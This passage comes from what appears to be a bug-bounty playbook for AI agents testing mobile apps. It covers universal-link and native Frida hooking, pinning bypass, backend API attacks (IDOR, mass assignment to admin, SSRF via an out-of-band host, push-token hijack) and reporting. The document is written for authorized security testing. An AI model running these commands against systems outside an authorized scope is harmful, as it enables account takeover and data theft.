frida -U -f "$TARGET" -l "$DYNAMIC_DIR/url_scheme.js" -o "$DYNAMIC_DIR/frida-scheme.log" --no-pause
# Prefer recon's pre-dumped file (content/policy-.well-known-apple-app-site-association.dump), else live.
RECON_AASA=~/.claude/MEMORY/BugBounty/Sessions/${BACKEND_SLUG:-$TARGET_SLUG}/recon/content/policy-.well-known-apple-app-site-association.dump
( [ -f "$RECON_AASA" ] && cat "$RECON_AASA" \
  || curl -s -x "$PROXY" -A "$UA" "https://target.com/.well-known/apple-app-site-association" -k ) | jq .
```
**Indicators:** Sensitive action via scheme param; AASA misconfig (broad paths, missing app IDs); WKWebView loads attacker URL.
**Validation:** Confirm the action executes from the crafted URL.
**Evasion / edge cases:** `WKWebView` with `allowFileAccessFromFileURLs`; JS bridge via `WKScriptMessageHandler`; scheme squatting between apps.
**Severity:** Token/action theft via universal link = High-Critical.
**Dispatch:** -> iOSAgent.

### 7.G Pasteboard cross-app leakage (platform angle)

**Procedure:**
```bash
# Android 12+: detect clipboard reads (system toast); confirm app reads/writes general clipboard
# iOS: check use of UIPasteboard.general (system-wide) vs a named, app-scoped pasteboard
grep -rnE 'UIPasteboard.general|generalPasteboard|setString' "$STATIC_DIR/headers" 2>/dev/null | head
```
**Indicators:** Sensitive data on the system clipboard/general pasteboard readable by any app.
**Validation:** Read it from a second app/process.
**Severity:** Medium.
**Dispatch:** -> AndroidAgent / iOSAgent.

**Phase artifacts:** `exported-runtime.txt`, drozer reports, `webview.txt`, `intent-redirect.txt`, `frida-scheme.log`, deep-link PoCs, `bridge-poc.html`.
**Gate-out:** Every exported edge, provider, link, bridge, and scheme tested from an unprivileged context with PoCs for each positive.

---

## Phase 8: RESILIENCE / ANTI-TAMPER (MASVS-RESILIENCE)

**Objective:** Assess the strength (and bypassability) of root/JB detection, anti-debug, obfuscation, pinning resistance, and attestation.
**Expert rationale:** For most bounty programs resilience is in-scope only as a *defense-in-depth* rating, but a trivially-defeated control on a high-value app (banking, wallet) is reportable and frequently chains with other findings.
**Gate-in:** Bypasses already attempted in Phase 2 (reuse those results).

### 8.A Root / jailbreak detection strength
**Procedure:** Reuse 2.D. Document whether detection is Java-only (trivial), native (`.so`), or attestation-backed.
**Indicators / Severity:** Java-only on a sensitive app = Low-Medium; native-only also bypassable = Low.
**Dispatch:** -> AndroidAgent / iOSAgent.

### 8.B Anti-debugging / anti-hooking
**Procedure:** Reuse 2.E; additionally check `ptrace`/`TracerPid`, Frida-port/`/proc/self/maps` scans in native via Phase 9.
**Indicators:** Frida-detection that a stealth runtime (frida-gadget renamed, magisk-hide) defeats.
**Severity:** Low-Medium.
**Dispatch:** -> ReverseEngineeringAgent.

### 8.C Obfuscation / string protection
**Procedure:** Reuse 1.E.
**Severity:** Missing on sensitive app = Low-Medium.
**Dispatch:** -> ReverseEngineeringAgent.

### 8.D Pinning resistance & runtime integrity / attestation

**Objective / hypothesis:** Whether pinning survives a determined runtime attacker, and whether the app relies on Play Integrity / SafetyNet / DeviceCheck / App Attest for server-trusted integrity.
**Procedure:**
```bash
grep -rnE 'SafetyNet|PlayIntegrity|attest|DeviceCheck|DCDevice|AppAttest|IntegrityManager' \
  "$STATIC_DIR/jadx/sources" "$STATIC_DIR/headers" 2>/dev/null | tee "$STATIC_DIR/attestation.txt"
```
**Indicators:** Integrity verdict checked only client-side (not server-validated) -> spoofable; pinning re-enabled at native layer but still defeated via libflutter/BoringSSL hook (9.B).
**Validation:** Show the app/server still trusts a tampered/instrumented client.
**Severity:** Client-only integrity verdict = Medium; pinning fully defeated on sensitive flow = Medium.
**Dispatch:** -> ReverseEngineeringAgent, -> AndroidAgent / iOSAgent.

**Phase artifacts:** `attestation.txt`, consolidated bypass evidence from Phase 2.
**Gate-out:** Each resilience control rated with a documented bypass (or noted as robust).

---

## Phase 9: NATIVE / BINARY ANALYSIS (MASVS-CODE)

**Objective:** Analyze and hook native code (`.so` / `.dylib` / Mach-O) for hidden logic, custom crypto, secrets, and memory-safety bugs.
**Expert rationale:** Anti-tamper, key derivation, and pinning increasingly live in native code; memory bugs there are real RCE.
**Gate-in:** Native libs present (1.F) or static analysis blocked by string decryption (1.E).
**Parallelizable:** Static RE and dynamic hooking run together.

### 9.A Native static analysis
**Procedure:**
```bash
for so in $(find "$STATIC_DIR/apktool/lib/arm64-v8a" -name '*.so'); do
  echo "== $so =="; readelf -d "$so" | grep NEEDED
  nm -D "$so" 2>/dev/null | grep -iE 'encrypt|decrypt|sign|verify|key|pin|jni|auth'
done | tee "$STATIC_DIR/native-symbols.txt"
# Headless Ghidra decompile of the key routine
analyzeHeadless /tmp/ghidra mob -import \
  "$STATIC_DIR/apktool/lib/arm64-v8a/libnative.so" -postScript Decompile.java \
  -scriptPath "$TOOLS" 2>/dev/null
```
**Indicators:** Custom crypto, embedded secrets, command exec, weak bounds handling.
**Validation:** Correlate with a runtime hook (9.B).
**Severity:** Per finding; native key derivation reversible = High.
**Dispatch:** -> ReverseEngineeringAgent.

### 9.B Native function hooking
**Procedure:**
```bash
cat > "$DYNAMIC_DIR/native_hook.js" <<'JS'
var base = Module.findBaseAddress('libnative.so');
if (base) {
  Module.enumerateExports('libnative.so').forEach(function (e) {
    if (e.type === 'function') console.log('[exp] ' + e.name + ' @ ' + e.address);
  });
  var enc = Module.findExportByName('libnative.so', 'Java_com_target_app_Crypto_encrypt');
  if (enc) Interceptor.attach(enc, {
    onEnter: function (a) { this.in = Java.cast(a[2], Java.use('java.lang.String')).toString(); },
    onLeave: function (r) { console.log('[enc] in=' + this.in); }
  });
  // BoringSSL pin bypass (Flutter): hook ssl_crypto_x509_session_verify_cert_chain
}
JS
frida -U -f "$TARGET" -l "$DYNAMIC_DIR/native_hook.js" -o "$DYNAMIC_DIR/frida-native.log" --no-pause
```
**Indicators:** Recovered plaintext/keys; pinning verify routine returns success after hook.
**Validation:** Reproduce key recovery / pinning defeat deterministically.
**Severity:** Native crypto/key recovery = High; native memory-corruption RCE = Critical.
**Dispatch:** -> ReverseEngineeringAgent.

**Phase artifacts:** `native-symbols.txt`, Ghidra exports, `frida-native.log`.
**Gate-out:** Native logic understood; secrets/crypto/pinning routines documented; memory-safety candidates triaged.

---

## Phase 10: BACKEND API TESTING (Shared backend track)

**Objective:** Attack the app's server API hard using the full API methodology — this is where most mobile bounties pay.
**Expert rationale:** The client is disposable; the server is the asset. With pinning bypassed and tokens captured (Phase 3), the API is now a normal web target with two authenticated identities.
**Gate-in:** Endpoint inventory + `$TOKEN_LOW`/`$TOKEN_HIGH` from Phase 3; scope-guarded backend hosts. Optional but recommended: fold in the recon hand-off if a recon run exists for this backend.
**Parallelizable:** All sub-techniques run in parallel across the endpoint list (orchestrator caps concurrency).

**Optional recon input (shared backend track):** If `W_RECON` ran against the app's backend domain, merge its framework-canonical attack-surface inventory into the endpoint list so mobile-discovered and recon-discovered surface are tested together.

```bash
# Canonical recon run dir (matches hunt-orchestrator.ts / SKILL.md): Sessions/<slug>/recon/
RECON_DIR=~/.claude/MEMORY/BugBounty/Sessions/${BACKEND_SLUG:-$TARGET_SLUG}/recon
if [ -d "$RECON_DIR" ]; then
  # High-priority backend targets recon already triaged
  cat "$RECON_DIR/reports/high-priority-targets.txt" 2>/dev/null >> "$HAR_DIR/endpoints-all.txt"
  # Live hosts + endpoints from the structured inventory
  jq -r '.. | .url? // empty' "$RECON_DIR/reports/attack-surface-inventory.json" 2>/dev/null \
    >> "$HAR_DIR/endpoints-all.txt"
  sort -u "$HAR_DIR/endpoints-all.txt" -o "$HAR_DIR/endpoints-all.txt"
  # Read recon's per-domain hand-off notes (api/cloud subdirs) before attacking
  cat "$RECON_DIR/reports/handoff-notes.md" 2>/dev/null
  # App-link / universal-link policy dumps tie the apps to their backend domains -> add to scope
  for d in "$RECON_DIR"/content/policy-.well-known-assetlinks.json.dump \
           "$RECON_DIR"/content/policy-.well-known-apple-app-site-association.dump; do
    [ -f "$d" ] && grep -hoE '[a-z0-9.-]+\.[a-z]{2,}' "$d" | sort -u >> "$HAR_DIR/backend-domains.txt"
  done
fi
```

### 10.A Broken authentication / authorization at the API
**Objective / hypothesis:** The server may trust client-asserted identity, accept tampered JWTs, or skip auth on some routes.
**Procedure:**
```bash
while read url; do scope_guard "$(echo "$url" | awk -F/ '{print $3}')" || continue
  # Unauthenticated access
  curl -s -x "$PROXY" -A "$UA" "$url" -k -o /dev/null -w "noauth %{http_code} $url\n"
done < "$HAR_DIR/endpoints-all.txt" | tee "$FINDINGS_DIR/noauth-scan.txt"
# JWT alg:none / weak-secret tests handled by AuthAgent using captured token
```
**Indicators:** 200 on sensitive routes without a token; tampered JWT accepted.
**Severity:** Auth bypass = Critical.
**Dispatch:** -> AuthAgent, -> OAuthAgent.

### 10.B BOLA / IDOR (object-level authorization)
**Objective / hypothesis:** Object IDs in mobile APIs are usually sequential/guessable; the server often fails to check ownership.
**Procedure:**
```bash
# Access user B's object with user A's (low-priv) token
curl -s -x "$PROXY" -A "$UA" -H "Authorization: Bearer $TOKEN_LOW" \
  "https://api.target.com/v1/users/USER_B_ID/profile" -k \
  -o "$FINDINGS_DIR/idor-userB.json" -w "%{http_code}\n"
```
**Indicators:** Low-priv token reads/writes another user's object (200 with B's data).
**Validation:** Cross-confirm the returned data belongs to B (distinct from A's, captured under `$TOKEN_HIGH`).
**Evasion / edge cases:** Try UUIDs harvested from traffic, hashed IDs, nested IDs, batch/GraphQL node IDs, method override (GET vs POST), wrapping ID in arrays.
**Severity:** Cross-tenant data access = Critical (CVSS ~8-9).
**Dispatch:** -> IDORAgent.

### 10.C Mass assignment / excessive data exposure
**Procedure:**
```bash
curl -s -x "$PROXY" -A "$UA" -H "Authorization: Bearer $TOKEN_LOW" \
  -H 'Content-Type: application/json' -X PUT "https://api.target.com/v1/users/me" \
  -d '{"role":"admin","is_premium":true,"verified":true}' -k \
  -o "$FINDINGS_DIR/massassign.json" -w "%{http_code}\n"
```
**Indicators:** Privileged fields accepted; response object leaks fields the UI never shows.
**Severity:** Privilege escalation via mass assignment = High-Critical.
**Dispatch:** -> APIAgent.

### 10.D SSRF from server-side fetchers
**Objective / hypothesis:** Mobile backends fetch URLs the client supplies (avatar import, link preview, webhook) — classic SSRF to cloud metadata.
**Procedure:**
```bash
# Use a Burp Collaborator OOB host; poll for interaction
bun $TOOLS/burp-bridge.ts --collaborator-poll --poll-max 30 &
curl -s -x "$PROXY" -A "$UA" -H "Authorization: Bearer $TOKEN_LOW" \
  -H 'Content-Type: application/json' -X POST "https://api.target.com/v1/import" \
  -d '{"url":"http://<COLLAB>/ssrf"}' -k
```
**Indicators:** Collaborator DNS/HTTP hit from the server; metadata/internal content reflected.
**Severity:** SSRF to cloud metadata = Critical.
**Dispatch:** -> SSRFAgent.

### 10.E API secrets / GraphQL / push / Firebase follow-up
**Procedure:**
```bash
# GraphQL introspection
curl -s -x "$PROXY" -A "$UA" -H "Authorization: Bearer $TOKEN_LOW" \
  -H 'Content-Type: application/json' -X POST "https://api.target.com/graphql" \
  -d '{"query":"{__schema{types{name fields{name}}}}"}' -k -o "$FINDINGS_DIR/graphql-introspect.json"
# Push registration hijack (spoof another device token)
curl -s -x "$PROXY" -A "$UA" -H "Authorization: Bearer $TOKEN_LOW" \
  -X POST "https://api.target.com/v1/devices/register" \
  -d '{"device_token":"ATTACKER","platform":"android"}' -k
# Firebase / S3 follow-up from 1.C with no auth
```
**Indicators:** Introspection enabled exposing admin mutations; push hijack; open Firebase/bucket.
**Severity:** Per finding; admin GraphQL mutation reachable = Critical.
**Dispatch:** -> APIAgent, -> SecretsExposureAgent.

**Phase artifacts:** `noauth-scan.txt`, `idor-userB.json`, `massassign.json`, collaborator hits, `graphql-introspect.json`, backend HARs.
**Gate-out:** Every endpoint tested for auth, BOLA/IDOR, mass assignment, SSRF, and secret exposure under both identities; positives have reproducible `curl` PoCs.

---

## Phase 11: REPORTING & HAND-OFF

**Objective:** Turn raw observations into validated, de-duplicated, scored findings and correlated kill chains, then a final report.
**Expert rationale:** Unvalidated findings waste triage cycles and burn program trust. Validation, root-cause de-dup, and chaining are what make a report credible and maximize payout.
**Gate-in:** All phases produced candidate findings into `$FINDINGS_DIR`.

### 11.A Aggregate evidence
```bash
# Collate Burp + harness + Frida + storage artifacts
bun $TOOLS/burp-bridge.ts --export-har --output "$HAR_DIR/final-traffic.har"
bun $TOOLS/burp-bridge.ts --issues > "$FINDINGS_DIR/burp-issues.json"
adb -s "$DEVICE_ANDROID" exec-out screencap -p > "$EVIDENCE_DIR/app-state.png"
# Redact any secrets accidentally captured before sharing
bun $TOOLS/credential-vault.ts --redact --file "$FINDINGS_DIR/idor-userB.json"
```

### 11.B Validation -> ValidatorAgent
Hand the full `$FINDINGS_DIR` to **ValidatorAgent**, which must:
- Reproduce each finding from its artifact (Frida script, `curl`, `adb`, `drozer`).
- Kill false positives (e.g., biometric "bypass" that is actually CryptoObject-bound; an exported component gated by a signature permission; a "secret" that is a sandbox key).
- De-duplicate by **root cause** (one missing server-side authorization check behind ten IDOR endpoints is one finding).
- Score CVSS 3.1 and 4.0 with business impact.
- Apply the hunt-mode gate (bounty vs pentest vs comprehensive) to decide what is reportable.

### 11.C Chaining -> ExploitChainAgent
Hand validated findings to **ExploitChainAgent** to correlate into kill chains and elevate combined severity, e.g.:
- Deep-link WebView bridge (7.E) -> token theft (4.A/6.C) -> BOLA on the API (10.B) = full account takeover.
- Hardcoded production key (1.B) -> Firebase/bucket access (1.C) -> mass PII exposure.
- Pinning bypass (2.C) + no server-side token revocation (6.C) = durable session theft.

### 11.D Final report
Each finding includes: MASVS group + MASTG test reference; severity (Critical/High/Medium/Low/Info); affected component/endpoint/native symbol; reproducible PoC; business impact; remediation with platform-specific code; CVSS 3.1 + 4.0 vectors.

**Report output:** `~/.claude/MEMORY/BugBounty/Sessions/${TARGET_SLUG}/reports/mobile_assessment_report.md`

### 11.E Concise N-point update (new tests performed)
On request, emit a tight N-point list of the new tests this run added beyond the baseline, e.g.:
1. Content-provider SQLi + path traversal via `content query`/`content read` and drozer scanners.
2. WebView `addJavascriptInterface` bridge RCE via deep-link-controlled URL with served PoC.
3. Dual-identity BOLA/IDOR sweep across the full captured endpoint inventory.
4. KeyStore/Keychain accessibility-class and CryptoObject-binding audit (true vs cosmetic biometric bypass).
5. SSRF on server-side fetchers via Burp Collaborator OOB.
6. Native BoringSSL/libflutter pinning hook and key-derivation recovery.
7. Backup/keyboard-cache/clipboard/snapshot at-rest exposure checks.

---

## Severity Escalation Triggers

These auto-escalate to Critical and notify immediately:
- Hardcoded production credentials/keys with privileged access.
- Authentication bypass (server-trusted JWT tamper, true biometric/local-auth bypass to server data).
- Exported content provider with SQL injection or arbitrary file read.
- WebView JavaScript bridge reachable from attacker-controlled content (RCE / token theft).
- Cross-tenant BOLA/IDOR on the backend API.
- SSRF reaching cloud metadata / internal services.
- Open Firebase RTDB/Firestore or storage bucket with PII.
- Cleartext transmission of credentials or tokens.
- Deep link / universal link that steals an OAuth code or session token.

---

## Agent Coordination Matrix

| Phase | Primary agent | Supporting agents | Data flow |
|-------|---------------|-------------------|-----------|
| 0 Profiling | AppReviewAgent | — | AppProfile.json |
| 1 Static | AndroidAgent, iOSAgent | SecretsExposureAgent, ReverseEngineeringAgent | decompiled tree, endpoints, secrets |
| 2 Dynamic setup | AndroidAgent, iOSAgent | ReverseEngineeringAgent | bypass scripts, decrypted traffic |
| 3 Network | APIAgent | AuthAgent, OAuthAgent | endpoint inventory, tokens, HAR |
| 4 Storage | AndroidAgent, iOSAgent | — | storage dumps |
| 5 Crypto | AndroidAgent, iOSAgent | ReverseEngineeringAgent, SecretsExposureAgent | key/crypto inventory |
| 6 Auth/Session | AuthAgent | OAuthAgent | session/token PoCs |
| 7 Platform | AndroidAgent, iOSAgent | SQLiAgent | IPC/link/bridge PoCs |
| 8 Resilience | ReverseEngineeringAgent | AndroidAgent, iOSAgent | bypass ratings |
| 9 Native | ReverseEngineeringAgent | — | native symbols, hooks |
| 10 Backend | APIAgent | AuthAgent, OAuthAgent, IDORAgent, SSRFAgent, SecretsExposureAgent | API findings |
| 11 Reporting | ValidatorAgent -> ExploitChainAgent | all | validated findings, kill chains |
